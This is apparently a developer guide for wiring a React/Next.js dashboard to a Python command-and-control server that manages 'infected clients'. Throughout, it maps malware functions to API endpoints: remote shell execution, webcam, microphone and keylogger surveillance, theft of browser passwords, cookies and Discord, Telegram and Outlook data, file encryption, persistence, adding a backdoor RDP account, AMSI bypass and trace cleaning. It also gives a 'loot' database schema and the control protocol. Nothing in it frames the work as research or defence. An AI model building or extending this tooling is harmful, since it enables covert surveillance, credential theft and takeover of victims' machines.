# Backend Integration Guide

This document explains how to integrate the C2 Dashboard frontend with the s.py backend server.

## Architecture Overview

```
┌─────────────────────┐
│   C2 Dashboard      │
│   (React/Next.js)   │
└──────────┬──────────┘
           │ WebSocket/HTTP
           │
┌──────────▼──────────┐
│   s.py C2 Server    │
│   (Python Socket)   │
└──────────┬──────────┘
           │
┌──────────▼──────────┐
│   Infected Clients  │
│   (Windows/Linux)   │
└─────────────────────┘
```

## s.py Features Mapping

The dashboard implements all major features from the s.py C2 server:

### 1. Client Management
**s.py Source**: `AdvancedC2Server.clients` dictionary, `_handle_client()`
**Dashboard**: `ClientsPanel` component
**Data Structure**:
```python
# s.py
clients: Dict[str, Any] = {
    'c2k9x1m4': {
        'ip': '192.168.1.105',
        'hostname': 'DESKTOP-USER001',
        'os': 'Windows 10',
        'user': 'administrator',
        'last_seen': '2024-03-22 14:30:22'
    }
}

# Dashboard API Endpoint
GET /api/clients -> List[Client]
GET /api/clients/:clientId -> Client
```

### 2. Command Execution
**s.py Source**: `CommandParser.parse()`, `send_command()`
**Dashboard**: `CommandPanel` component

#### Remote Execution Commands
```python
# Shell Command
send_command(targets, 'shell', {'command': 'dir'})
send_command(targets, 'powershell', {'command': 'Get-Process'})
send_command(targets, 'script', {'code': script_content})

# Dashboard API
POST /api/commands/execute
{
  "clientIds": ["c2k9x1m4"],
  "commandType": "shell",
  "params": { "command": "dir" }
}
```

#### Surveillance Commands
```python
# Screenshot
send_command(targets, 'screenshot', {'height': 0})
# Webcam
send_command(targets, 'webcam', {'resolution': '640x480'})
# Stream
send_command(targets, 'stream', {'action': 'start', 'fps': 15, 'height': 480})
# Microphone
send_command(targets, 'microphone', {'duration': 10})
# Keylogger
send_command(targets, 'keylog', {'action': 'dump'})

# Dashboard API
POST /api/surveillance/screenshot
POST /api/surveillance/webcam
POST /api/surveillance/stream
POST /api/surveillance/audio
```

#### File Operations
```python
# Download
send_command(targets, 'download', {'path': 'C:\\Users\\user\\file.txt'})
# Upload
send_command(targets, 'upload', {'path': local_path})
# Browse
send_command(targets, 'file_browser', {'path': '.'})
# Encryption
send_command(targets, 'file_crypt', {'path': file_path, 'action': 'encrypt'})

# Dashboard API
POST /api/files/download
POST /api/files/upload
GET /api/files/browse
POST /api/files/encrypt
```

#### Credentials Extraction
```python
# Browser Passwords
send_command(targets, 'browser_passwords')
# Cookies
send_command(targets, 'browser_cookies')
# WiFi
send_command(targets, 'wifi_passwords')
# Discord
send_command(targets, 'extract_discord')
# Telegram
send_command(targets, 'extract_telegram')
# Outlook
send_command(targets, 'extract_outlook')

# Dashboard API
POST /api/credentials/browser-passwords
POST /api/credentials/browser-cookies
POST /api/credentials/wifi
POST /api/credentials/discord
```

#### System Information
```python
# System Info
send_command(targets, 'system_info')
# Process Management
send_command(targets, 'process', {'action': 'list'|'kill', 'pid': pid})
# Registry
send_command(targets, 'registry', {'action': 'read'|'write', 'path': path})
# Port Scan
send_command(targets, 'port_scan', {'target': '192.168.1.1', 'ports': '1-1024'})
# AV Detection
send_command(targets, 'av_discovery')

# Dashboard API
GET /api/system/info/:clientId
GET /api/system/processes/:clientId
POST /api/system/process/kill
POST /api/system/registry
POST /api/system/scan
GET /api/system/av-detect
```

#### Persistence
```python
# Enable Persistence
send_command(targets, 'persistence')
# Privilege Elevation
send_command(targets, 'elevate')
# RDP Enable
send_command(targets, 'enable_rdp', {
    'add_user': True,
    'username': 'svcadmin',
    'password': 'P@ssw0rd!'
})
# AMSI Bypass
send_command(targets, 'amsi_bypass')

# Dashboard API
POST /api/persistence/enable
POST /api/persistence/elevate
POST /api/persistence/rdp
POST /api/persistence/amsi
```

#### Cleanup
```python
# Clean Traces
send_command(targets, 'clean_traces')
# Self Destruct
send_command(targets, 'self_destruct')
# Abort Tasks
send_command(targets, 'abort', {'task_id': 'all'})

# Dashboard API
POST /api/cleanup/traces
POST /api/cleanup/destruct
POST /api/cleanup/abort
```

### 3. System Monitoring
**s.py Source**: Metric collection in message handling
**Dashboard**: `MonitoringPanel` component

#### Metrics to Collect
```python
# From system_info command response
{
    'cpu_percent': 45.2,
    'memory_percent': 62.1,
    'memory_available': 8589934592,  # bytes
    'disk_free': 107374182400,  # bytes
    'network_io': {
        'bytes_sent': 1024000,
        'bytes_recv': 2048000
    },
    'processes': 342,
    'uptime': 3913440  # seconds
}

# Dashboard API
GET /api/metrics/system/:clientId
GET /api/metrics/performance/:clientId
GET /api/metrics/network/:clientId
```

## Implementation Steps

### 1. Create Backend API Routes

Create `/api` folder with these routes:

```typescript
// app/api/clients/route.ts
export async function GET() {
  // Connect to s.py server
  // Query clients from database
  // Return client list
}

// app/api/commands/execute/route.ts
export async function POST(req: Request) {
  const { clientIds, commandType, params } = await req.json()
  // Send command to s.py server
  // Return execution status
}

// app/api/metrics/system/[clientId]/route.ts
export async function GET(req: Request, { params }) {
  // Query system metrics from s.py
  // Return performance data
}
```

### 2. Add Real-Time Data Streaming

Implement WebSocket connection for live updates:

```typescript
// app/api/stream/[clientId]/route.ts
import { WebSocketServer } from 'ws'

export async function GET(req: Request, { params }) {
  // Establish WebSocket connection to s.py
  // Stream real-time metrics
  // Stream command output
  // Stream surveillance data
}
```

### 3. Implement Database Adapter

The s.py server uses SQLite (`DatabaseManager` class):

```python
# s.py Database Schema
CREATE TABLE clients (
    id TEXT PRIMARY KEY,
    ip TEXT,
    hostname TEXT,
    os TEXT,
    user TEXT,
    last_seen TEXT
)

CREATE TABLE loot (
    id INTEGER PRIMARY KEY,
    client_id TEXT,
    type TEXT,
    filename TEXT,
    path TEXT,
    timestamp TEXT
)
```

Create adapter in Next.js to query this database:

```typescript
// lib/database.ts
import sqlite3 from 'sqlite3'

const db = new sqlite3.Database('c2.db')

export async function getClients() {
  return new Promise((resolve, reject) => {
    db.all('SELECT * FROM clients', (err, rows) => {
      if (err) reject(err)
      resolve(rows)
    })
  })
}
```

### 4. Add Command Logging

The s.py server has a `Logger` class:

```python
# s.py
logger.info("Command executed")
logger.error("Command failed")
logger.success("Command succeeded")

# Dashboard should track:
# - Command execution timestamp
# - Client target
# - Command type
# - Command parameters
# - Execution status
# - Output/results
```

Implement logging in dashboard:

```typescript
// lib/logging.ts
export async function logCommand(log: {
  clientId: string
  commandType: string
  params: any
  status: 'pending' | 'success' | 'error'
  output?: string
}) {
  // POST to /api/logs
  // Store in database
}
```

### 5. Connection Management

The `AdvancedC2Server.send_command()` method sends to all connected clients:

```python
def send_command(self, targets, c_type, params=None):
    msg = {'type': c_type, 'params': params or {}, 'id': task_id}
    for target_id in targets:
        if target_id in self.clients:
            self.clients[target_id]['sock'].send(encrypted_msg)
```

In dashboard, implement multi-client operations:

```typescript
// components/command-panel.tsx
const executeCommand = async (command: Command, clientIds: string[]) => {
  for (const clientId of clientIds) {
    await fetch('/api/commands/execute', {
      method: 'POST',
      body: JSON.stringify({
        clientId,
        commandType: command.id,
        params: command.params
      })
    })
  }
}
```

## Network Protocol

The s.py server uses:
- **Socket**: TCP on configurable port (default 4444)
- **Encryption**: Fernet (symmetric encryption)
- **Message Format**: JSON, length-prefixed with 4-byte header

```python
# s.py Message Format
[4 bytes: message length][Fernet encrypted JSON]

# JSON payload
{
    'type': 'screenshot',
    'params': {},
    'id': 'task_123'
}
```

## Security Considerations

1. **Encryption**: All s.py communications are Fernet-encrypted
2. **Authentication**: Implement API key authentication for dashboard
3. **HTTPS**: Use TLS for dashboard to server communication
4. **Rate Limiting**: Prevent command spam
5. **Logging**: Audit all executed commands
6. **Access Control**: Implement role-based access for dashboard users

## Testing Integration

```bash
# Start s.py server
python s.py --host 127.0.0.1 --port 4444

# Start dashboard
npm run dev

# Test client connection
# (Inject payload into test client)

# Verify in dashboard
# - Client appears in clients panel
# - Metrics update in real-time
# - Commands execute successfully
```

## Environment Variables

```env
# .env.local
NEXT_PUBLIC_C2_SERVER_HOST=localhost
NEXT_PUBLIC_C2_SERVER_PORT=4444
C2_SERVER_PASSWORD=your_secure_password
DATABASE_URL=./c2.db
LOG_LEVEL=info
```

## API Response Examples

```json
// GET /api/clients
{
  "clients": [
    {
      "id": "c2k9x1m4",
      "hostname": "DESKTOP-USER001",
      "ip": "192.168.1.105",
      "os": "Windows 10",
      "user": "administrator",
      "status": "online",
      "lastSeen": "2024-03-22T14:30:22Z"
    }
  ]
}

// POST /api/commands/execute
{
  "taskId": "task_123",
  "status": "queued",
  "clientId": "c2k9x1m4",
  "commandType": "screenshot"
}

// GET /api/metrics/system/:clientId
{
  "cpu": 45,
  "memory": 62,
  "disk": 78,
  "network": 28,
  "processes": 342,
  "uptime": "45d 12h 34m"
}
```

## Troubleshooting

### Client Not Showing in Dashboard
- Verify payload was injected successfully
- Check s.py server logs: `c2_server.log`
- Verify database: `sqlite3 c2.db "SELECT * FROM clients"`
- Check network connectivity between client and server

### Commands Not Executing
- Verify client socket is active
- Check command parameters match s.py expectations
- Review s.py error logs
- Verify encryption key matches

### Metrics Not Updating
- Ensure client responds to system_info command
- Verify database is being updated
- Check WebSocket connection is established
- Review performance metrics parsing

## Additional Resources

- s.py Source Code: `s-hfWe4.py`
- Database Schema: `DatabaseManager` class in s.py
- Command Reference: `CommandParser.parse()` method
- Message Protocol: `_send_raw()`, `_recv_raw()` methods
